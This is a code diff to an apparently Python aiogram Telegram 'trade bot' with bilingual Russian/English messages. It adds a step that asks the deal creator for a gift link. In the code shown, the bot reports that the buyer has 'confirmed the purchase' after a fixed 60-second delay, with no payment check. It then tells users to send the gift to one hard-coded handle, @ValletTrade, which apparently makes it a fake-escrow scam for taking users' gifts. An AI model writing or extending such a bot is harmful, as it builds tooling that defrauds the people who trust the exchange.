@@ -1,6 +1,7 @@
 import asyncio
 import logging
 import random
+import re
 from aiogram import Bot, Dispatcher, types
 from aiogram.filters import Command
 from aiogram.fsm.context import FSMContext
@@ -23,7 +24,7 @@ storage = MemoryStorage()
 dp = Dispatcher(storage=storage)
 
 # ==================== ХРАНИЛИЩЕ СДЕЛОК ====================
-# Структура: {exchange_id: {"password": "12345", "creator": user_id, "price": None, "buyer": None}}
+# Структура: {exchange_id: {"password": "12345", "creator": user_id, "price": None, "gift_link": None, "buyer": None, "status": "..."}}
 exchanges = {}
 
 # ==================== КНОПКИ ====================
@@ -43,9 +44,11 @@ def get_main_keyboard():
 class TradeStates(StatesGroup):
     waiting_for_exchange = State()
     waiting_for_password = State()
+    waiting_for_gift_link = State()      # Новое состояние для ссылки
     waiting_for_price = State()
     waiting_for_confirmation = State()
-    waiting_for_create_price = State()  # Для создания сделки
+    waiting_for_create_link = State()    # Для создания сделки - ссылка
+    waiting_for_create_price = State()   # Для создания сделки - цена
 
 # ==================== КОМАНДЫ ====================
 @dp.message(Command("start"))
@@ -100,24 +103,60 @@ async def button_create_exchange(message: types.Message, state: FSMContext):
     exchanges[exchange_id] = {
         "password": password,
         "creator": message.from_user.id,
+        "gift_link": None,
         "price": None,
         "buyer": None,
-        "status": "waiting_for_price"  # ожидание цены
+        "status": "waiting_for_link"
     }
     
     await state.update_data(exchange_id=exchange_id)
-    await state.set_state(TradeStates.waiting_for_create_price)
+    await state.set_state(TradeStates.waiting_for_create_link)
     
     await message.answer(
         f"✅ *Сделка успешно создана!*\n\n"
         f"📋 *Номер сделки:* `{exchange_id}`\n"
         f"🔑 *Пароль:* `{password}`\n\n"
-        f"💰 Укажите сумму за подарок (в долларах):\n\n"
+        f"🔗 Отправьте *ссылку на подарок*:\n"
+        f"_(например, ссылка на товар в магазине)_\n\n"
         f"⚠️ *Сохраните пароль!* Он понадобится покупателю.\n\n"
         f"✅ *Exchange created successfully!*\n\n"
         f"📋 *Exchange ID:* `{exchange_id}`\n"
         f"🔑 *Password:* `{password}`\n\n"
-        f"💰 Set the price for the gift (in dollars):",
+        f"🔗 Send the *gift link*:",
+        parse_mode="Markdown",
+        reply_markup=get_main_keyboard()
+    )
+
+@dp.message(TradeStates.waiting_for_create_link)
+async def process_create_link(message: types.Message, state: FSMContext):
+    """Обработка ссылки на подарок при создании"""
+    gift_link = message.text.strip()
+    
+    # Простая проверка на ссылку
+    if not re.match(r'^https?://', gift_link):
+        await message.answer(
+            "❌ Пожалуйста, отправьте *ссылку* (начинается с http:// или https://):\n"
+            "❌ Please send a *link* (starts with http:// or https://):",
+            parse_mode="Markdown"
+        )
+        return
+    
+    data = await state.get_data()
+    exchange_id = data.get('exchange_id')
+    
+    # Сохраняем ссылку
+    if exchange_id in exchanges:
+        exchanges[exchange_id]["gift_link"] = gift_link
+        exchanges[exchange_id]["status"] = "waiting_for_price"
+    
+    await state.update_data(gift_link=gift_link)
+    await state.set_state(TradeStates.waiting_for_create_price)
+    
+    await message.answer(
+        f"✅ *Ссылка сохранена!*\n\n"
+        f"💰 Теперь укажите сумму за подарок (в долларах):\n\n"
+        f"✅ *Link saved!*\n\n"
+        f"💰 Now set the price for the gift (in dollars):",
         parse_mode="Markdown",
         reply_markup=get_main_keyboard()
     )
@@ -144,6 +183,7 @@ async def process_create_price(message: types.Message, state: FSMContext):
     
     data = await state.get_data()
     exchange_id = data.get('exchange_id')
+    gift_link = data.get('gift_link')
     
     # Обновляем цену в сделке
     if exchange_id in exchanges:
@@ -159,12 +199,13 @@ async def process_create_price(message: types.Message, state: FSMContext):
     await message.answer(
         f"✅ *Сделка создана!*\n\n"
         f"📋 *Номер сделки:* `{exchange_id}`\n"
+        f"🔗 *Ссылка на подарок:* {gift_link}\n"
         f"💰 *Сумма:* {price_str}\n"
         f"🔑 *Пароль:* `{exchanges[exchange_id]['password']}`\n\n"
-        f"⏳ Ожидайте подключения покупателя...\n"
-        f"Как только покупатель подключится, вы получите уведомление.\n\n"
+        f"⏳ Ожидайте подключения покупателя...\n\n"
         f"✅ *Exchange created!*\n\n"
         f"📋 *Exchange ID:* `{exchange_id}`\n"
+        f"🔗 *Gift link:* {gift_link}\n"
         f"💰 *Amount:* {price_str}\n"
         f"🔑 *Password:* `{exchanges[exchange_id]['password']}`\n\n"
         f"⏳ Waiting for buyer to connect...",
@@ -256,6 +297,8 @@ async def process_password(message: types.Message, state: FSMContext):
     exchanges[exchange_id]["status"] = "active"
     
     price = exchanges[exchange_id]["price"]
+    gift_link = exchanges[exchange_id]["gift_link"]
+    
     if price.is_integer():
         price_str = f"${int(price)}"
     else:
@@ -264,10 +307,12 @@ async def process_password(message: types.Message, state: FSMContext):
     # Уведомляем покупателя
     await message.answer(
         f"✅ *Вы успешно подключились к сделке #{exchange_id}!*\n"
-        f"💰 Сумма: {price_str}\n\n"
+        f"🔗 *Ссылка на подарок:* {gift_link}\n"
+        f"💰 *Сумма:* {price_str}\n\n"
         f"⏳ Ожидайте подтверждения от продавца...\n\n"
         f"✅ *You successfully connected to exchange #{exchange_id}!*\n"
-        f"💰 Amount: {price_str}\n\n"
+        f"🔗 *Gift link:* {gift_link}\n"
+        f"💰 *Amount:* {price_str}\n\n"
         f"⏳ Waiting for seller confirmation...",
         parse_mode="Markdown",
         reply_markup=get_main_keyboard()
@@ -279,11 +324,13 @@ async def process_password(message: types.Message, state: FSMContext):
         await bot.send_message(
             creator_id,
             f"✅ *Кто-то подключился к вашей сделке #{exchange_id}!*\n"
-            f"💰 Сумма: {price_str}\n\n"
+            f"🔗 *Ссылка на подарок:* {gift_link}\n"
+            f"💰 *Сумма:* {price_str}\n\n"
             f"⏳ Ожидайте 1 минуту...\n"
             f"Покупатель подтвердит покупку через минуту.\n\n"
             f"✅ *Someone connected to your exchange #{exchange_id}!*\n"
-            f"💰 Amount: {price_str}\n\n"
+            f"🔗 *Gift link:* {gift_link}\n"
+            f"💰 *Amount:* {price_str}\n\n"
             f"⏳ Please wait 1 minute...\n"
             f"The buyer will confirm the purchase in a minute.",
             parse_mode="Markdown"
@@ -304,14 +351,16 @@ async def process_password(message: types.Message, state: FSMContext):
     # Финальное сообщение для покупателя
     await message.answer(
         f"✅ *Покупатель подтвердил покупку!*\n"
-        f"📦 Отправьте подарок: @ValletTrade\n\n"
+        f"📦 Отправьте подарок продавцу: @ValletTrade\n\n"
         f"📋 *Детали сделки:*\n"
         f"└ Номер: #{exchange_id}\n"
+        f"└ Ссылка: {gift_link}\n"
         f"└ Сумма: {price_str}\n\n"
         f"✅ *Buyer confirmed the purchase!*\n"
-        f"📦 Send the gift to: @ValletTrade\n\n"
+        f"📦 Send the gift to the seller: @ValletTrade\n\n"
         f"📋 *Exchange details:*\n"
         f"└ ID: #{exchange_id}\n"
+        f"└ Link: {gift_link}\n"
         f"└ Amount: {price_str}",
         parse_mode="Markdown",
         reply_markup=get_main_keyboard()
@@ -325,11 +374,13 @@ async def process_password(message: types.Message, state: FSMContext):
             f"📦 Отправьте подарок: @ValletTrade\n\n"
             f"📋 *Детали сделки:*\n"
             f"└ Номер: #{exchange_id}\n"
+            f"└ Ссылка: {gift_link}\n"
             f"└ Сумма: {price_str}\n\n"
             f"✅ *Buyer confirmed the purchase!*\n"
-            f"📦 Send the gift to: @ValletTrade\n\n"
+            f"📦 Send the gift: @ValletTrade\n\n"
             f"📋 *Exchange details:*\n"
             f"└ ID: #{exchange_id}\n"
+            f"└ Link: {gift_link}\n"
             f"└ Amount: {price_str}",
             parse_mode="Markdown"
         )
@@ -388,6 +439,7 @@ async def main():
     print("🤖 TRADE BOT ЗАПУЩЕН!")
     print("📋 Рандомный ID: 5 цифр")
     print("🔑 Рандомный пароль: 5 цифр")
+    print("🔗 Запрос ссылки на подарок")
     print("⏳ Задержка перед подтверждением: 60 секунд")
     print("💰 Валюта: Доллары ($)")
     print("=" * 50)
